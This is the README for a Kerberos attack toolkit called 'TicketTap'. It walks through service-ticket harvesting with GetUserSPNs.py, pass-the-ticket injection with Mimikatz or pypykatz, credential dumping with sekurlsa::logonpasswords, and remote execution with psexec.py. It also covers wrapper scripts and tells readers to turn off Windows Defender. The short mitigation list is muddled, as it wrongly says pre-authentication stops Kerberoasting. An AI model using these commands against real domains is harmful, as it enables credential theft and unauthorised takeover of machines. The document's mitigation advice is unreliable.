# TicketTap: Remote Code Execution, Lateral Movement, Authentication Bypass, and Privilege Escalation via Kerberos TGS Exploitation

**TicketTap** is a multi-faceted vulnerability exploitation chain leveraging **Kerberos TGS (Ticket Granting Service) tickets** to achieve **Remote Code Execution (RCE)**, **Lateral Movement**, **Authentication Bypass**, and **Privilege Escalation** within a networked environment. This exploit allows attackers to bypass authentication, escalate privileges, and execute arbitrary commands remotely by injecting Kerberos TGS tickets into memory.

---

## Table of Contents
- [Overview](#overview)
- [Exploitation Chain Summary](#exploitation-chain-summary)
- [Detailed Steps for TicketTap](#detailed-steps-for-tickettap)
  - [Step 1: Obtain a TGS Ticket](#step-1-obtain-a-tgs-ticket)
  - [Step 2: Inject the TGS Ticket (Pass-the-Ticket)](#step-2-inject-the-tgs-ticket-pass-the-ticket)
  - [Step 3: Access the Target via RDP or SMB](#step-3-access-the-target-via-rdp-or-smb)
  - [Step 4: Privilege Escalation](#step-4-privilege-escalation)
  - [Step 5: Remote Code Execution (RCE)](#step-5-remote-code-execution-rce)
- [Running the Provided Scripts](#running-the-provided-scripts)
  - [Bash Script (macOS/Linux)](#bash-script-macoslinux)
  - [PowerShell Script (Windows)](#powershell-script-windows)
- [Setting Up the Environment](#setting-up-the-environment)
  - [macOS/Linux Setup](#macoslinux-setup)
  - [Windows Setup](#windows-setup)
- [Mitigation Strategies](#mitigation-strategies)
- [Tools Used](#tools-used)
- [Disclaimer](#disclaimer)

---

## Exploitation Chain Summary

The **TicketTap** exploitation chain follows these key steps:
1. **Obtain a TGS Ticket** using **SPN querying**.
2. **Inject the TGS** into the current session using **Mimikatz** or **pypykatz** (Pass-the-Ticket).
3. **Authenticate** to target services such as **RDP** or **SMB**.
4. **Escalate Privileges** to a highly privileged account.
5. **Execute Remote Code** using **PsExec** or other tools to gain control of the target machine.

---

## Detailed Steps for TicketTap

### Step 1: Obtain a TGS Ticket

You can extract TGS tickets for service accounts using **Impacket's `GetUserSPNs.py`**:
```bash
python3 GetUserSPNs.py <domain>/<username>:<password> -request
```
This will output the **$krb5tgs$** format hash.

### Step 2: Inject the TGS Ticket (Pass-the-Ticket)

Inject the TGS ticket using **Mimikatz** or **pypykatz**.

#### Mimikatz (Windows):
```bash
mimikatz# kerberos::ptt <path_to_tgs.kirbi>
```

#### pypykatz (macOS/Linux):
```bash
python3 pypykatz kerberos ptt <path_to_tgs.kirbi>
```

### Step 3: Access the Target via RDP or SMB

#### RDP (Windows):
```bash
mstsc /v:<target-ip>
```

#### RDP (macOS/Linux):
```bash
rdesktop <target-ip>
```

### Step 4: Privilege Escalation

Leverage tools like **Mimikatz** to extract further credentials and escalate privileges:
```bash
mimikatz# sekurlsa::logonpasswords
```

### Step 5: Remote Code Execution (RCE)

Use **PsExec** to run commands on the target machine.

#### PsExec (Windows):
```bash
python3 psexec.py <username>@<domain> -k -no-pass <target-ip>
```

---

## Running the Provided Scripts

### Bash Script (macOS/Linux)

To use the **Bash script** with **pypykatz** for macOS/Linux, follow the instructions below:

#### Example Usage:
```bash
./tickettap.sh -u Username -t /path/to/TGS.kirbi -m /path/to/pypykatz -ip <ip addr>
```

- This injects the **TGS** for user `Username` and attempts an RDP connection to the target IP.
- If you want to use **PsExec**, provide the `-psexec`, `-d`, and `-pu` flags as well.

#### Flags:
- `-u`: Username for the TGS.
- `-t`: Path to the `.kirbi` file.
- `-m`: Path to **pypykatz**.
- `-ip`: Target IP for **RDP**.
- `-psexec`: Path to **Impacket's `psexec.py`**.
- `-d`: Domain name for **PsExec**.
- `-pu`: Username for **PsExec**.

### PowerShell Script (Windows)

For **Windows**, use the PowerShell script to inject a **TGS** and attempt an RDP connection or **PsExec**.

#### Example Usage:
```bash
.\tickettap.ps1 /u Username /t C:\path\to\TGS.kirbi /m C:\path\to\mimikatz.exe /ip <ip addr>
```

- Injects the **TGS** and attempts to establish an RDP connection.
- For **PsExec**, provide `/psexec`, `/domain`, and `/psexecUser`.

---

## Setting Up the Environment

Here are setup commands to create the necessary directories, download scripts, and clone dependencies for **macOS/Linux** and **Windows**.

### macOS/Linux Setup

1. **Create a directory** and **download scripts**:
    ```bash
    mkdir TicketTap && cd TicketTap
    curl -O https://raw.githubusercontent.com/jleuth/TicketTap/refs/heads/main/tickettap.sh > tickettap.sh
    ```

2. **Clone dependencies**:
    ```bash
    curl -O https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/GetUserSPNs.py > GetUserSPNs.py
    pip3 install pypykatz
    ```

### Windows Setup

1. **Create a directory** and **download scripts**:
    ```powershell
    mkdir TicketTap && cd TicketTap
    curl -O https://raw.githubusercontent.com/jleuth/TicketTap/refs/heads/main/tickettap.ps1 > tickettap.ps1
    ```

2. **Clone dependencies**:
    ```powershell
    curl -O https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/GetUserSPNs.py > GetUserSPNs.py
    git clone https://github.com/ParrotSec/mimikatz.git 
    ```

3. **Build Mimikatz**:
  Annoyingly, Microsoft HATES Mimikatz, and Windows Defender goes fucking NUTS if you dare even download it. Mimikatz is safe, and [FOSS](https://github.com/ParrotSec/mimikatz) so there's nothing to fear. TEMPORARILY disable Real Time Protection in Defender settings, do what you need to do with Mimikatz, then TURN IT BACK ON! Windows Defender is ass, but it's better than nothing.

---

## Mitigation Strategies

To protect against **TicketTap**, consider the following mitigations:
1. **Enable Kerberos pre-authentication** to prevent **Kerberoasting**.
2. **Limit service account privileges** and audit access control.
3. **Monitor Kerberos authentication logs** for anomalies.
4. **Patch Kerberos-related vulnerabilities** to minimize the risk of exploitation.

---

## Tools Used

- **Mimikatz**: Extract and inject Kerberos tickets.
- **pypykatz**: Python-based Kerberos manipulation (macOS/Linux).
- **Impacket**: Tools for querying SPNs, executing PsExec, etc.

---

## Disclaimer

This repository is for **educational purposes** only. Unauthorized use of these techniques on systems without permission is illegal.